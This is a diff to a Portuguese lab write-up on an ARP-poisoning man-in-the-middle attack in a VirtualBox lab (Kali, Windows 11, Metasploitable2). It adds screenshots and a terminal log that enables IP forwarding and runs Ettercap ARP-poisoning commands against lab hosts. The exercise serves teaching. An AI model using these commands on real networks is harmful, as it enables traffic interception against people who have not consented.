@@ -116,9 +116,204 @@ DHCP: [192.168.56.100] ACK : 192.168.56.103 255.255.255.0 GW invalid
 
 > O endereço MAC `08-00-27-5a-87-bc` pertence ao Kali Linux. A vítima (Windows 11) passou a associar o IP da Metasploitable2 ao MAC do atacante, desviando todo o tráfego destinado a `.100` para o Kali — caracterizando o ataque MITM.
 
-📸 *[Inserir print: arp -a antes do ataque]*  
-📸 *[Inserir print: arp -a depois do ataque]*  
-📸 *[Inserir print: terminal do Ettercap com as vítimas]*
+📸 <img width="1091" height="825" alt="1" src="https://github.com/user-attachments/assets/4b509966-afea-4670-bafa-07335be973f8" />
+📸 <img width="1024" height="768" alt="VirtualBox_Windows11_21_10_2026_13_42_14" src="https://github.com/user-attachments/assets/e8166e4b-5efc-49ef-bac3-7efbfa79eb07" />
+📸 *[terminal do Ettercap com as vítimas]*
+┌──(kali㉿kali)-[~]
+└─$ ping 192.168.56.103
+PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
+^C
+--- 192.168.56.103 ping statistics ---
+23 packets transmitted, 0 received, 100% packet loss, time 24715ms
+
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ping 192.168.56.103
+PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
+64 bytes from 192.168.56.103: icmp_seq=1 ttl=128 time=1.06 ms
+64 bytes from 192.168.56.103: icmp_seq=2 ttl=128 time=2.32 ms
+64 bytes from 192.168.56.103: icmp_seq=3 ttl=128 time=0.788 ms
+64 bytes from 192.168.56.103: icmp_seq=4 ttl=128 time=0.747 ms
+64 bytes from 192.168.56.103: icmp_seq=5 ttl=128 time=0.712 ms
+64 bytes from 192.168.56.103: icmp_seq=6 ttl=128 time=0.752 ms
+64 bytes from 192.168.56.103: icmp_seq=7 ttl=128 time=0.756 ms
+64 bytes from 192.168.56.103: icmp_seq=8 ttl=128 time=1.04 ms
+64 bytes from 192.168.56.103: icmp_seq=9 ttl=128 time=1.03 ms
+64 bytes from 192.168.56.103: icmp_seq=10 ttl=128 time=0.697 ms
+^C
+--- 192.168.56.103 ping statistics ---
+10 packets transmitted, 10 received, 0% packet loss, time 9837ms
+rtt min/avg/max/mdev = 0.697/0.988/2.317/0.462 ms
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ^V^H
+: command not found
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo sysctl -w net.ipv4.ip_forward=1
+[sudo] password for kali: 
+net.ipv4.ip_forward = 1
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ cat /proc/sys/net/ipv4/ip_forward
+1
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.103// /192.168.56.1//
+
+ettercap 0.8.4.1 copyright 2001-2026 Ettercap Development Team
+
+Listening on:
+  eth0 -> 08:00:27:5A:87:BC
+          192.168.56.102/255.255.255.0
+          fe80::d0ac:8847:70e3:a73/64
+
+This product includes GeoLite2 Data created by MaxMind, available from https://www.maxmind.com/.
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  56 ports monitored
+38702 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 192.168.56.103 08:00:27:1D:33:D9
+
+ GROUP 2 : 192.168.56.1 0A:00:27:00:00:0C
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+
+ Received packets    :       37
+ Dropped packets     :        0  0.00 %
+ Forwarded           :        1  bytes:       28
+
+ Current queue len   : 0/1
+ Sampling rate       : 50
+
+ Bottom Half received packet : pck:       33  byte:     1918
+ Top Half received packet    : pck:        3  byte:       54
+ Interesting packets         : 9.09 %
+
+ Bottom Half packet rate : worst:        0  adv:        0 p/s
+ Top Half packet rate    : worst:        0  adv:        0 p/s
+
+ Bottom Half throughput  : worst:        0  adv:        0 b/s
+ Top Half throughput     : worst:        0  adv:        0 b/s
+
+
+
+ [PROFILES] Inline help:
+
+   [lL]  - detail on local hosts
+   [rR]  - detail on remote hosts
+   [sS]  - select a specific host
+   [p]   - purge local hosts
+   [P]   - purge remote hosts
+   [qQ]  - return to main interface
+
+No collected profiles !!
+LOCAL hosts purged !
+Returning to main menu...
+
+Packet visualization restarted...
+
+Packet visualization stopped...
+
+Inline help:
+
+ [vV]      - change the visualization mode
+ [pP]      - activate a plugin
+ [fF]      - (de)activate a filter
+ [lL]      - print the hosts list
+ [oO]      - print the profiles list
+ [cC]      - print the connections list
+ [rR]      - adjust SSL intercept rules
+ [sS]      - print interfaces statistics
+ [<space>] - stop/cont printing packets
+ [qQ]      - quit
+
+
+Packet visualization restarted...
+
+Packet visualization stopped...
+SSL Intercepts
+ # IP Version                 Server IP Service
+'d <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
+'d <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
+'d <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
+'d <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
+'d <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
+'d <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
+'d <number>' to delete or 'i' to insert new redirect (0 to quit): 
+Invalid input
+'d <number>' to delete or 'i' to insert new redirect (0 to quit): 0
+
+
+
+User requested a CTRL+C... (deprecated, next time use proper shutdown)
+
+^C^C^C^C
+^C^C^C^C
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.103// /192.168.56.100//
+
+ettercap 0.8.4.1 copyright 2001-2026 Ettercap Development Team
+
+Listening on:
+  eth0 -> 08:00:27:5A:87:BC
+          192.168.56.102/255.255.255.0
+          fe80::d0ac:8847:70e3:a73/64
+
+This product includes GeoLite2 Data created by MaxMind, available from https://www.maxmind.com/.
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  56 ports monitored
+38702 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 192.168.56.103 08:00:27:1D:33:D9
+
+ GROUP 2 : 192.168.56.100 08:00:27:57:3B:C4
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+DHCP: [08:00:27:1D:33:D9] REQUEST 192.168.56.103
+DHCP: [192.168.56.100] ACK : 192.168.56.103 255.255.255.0 GW invalid 
 
 ---
 
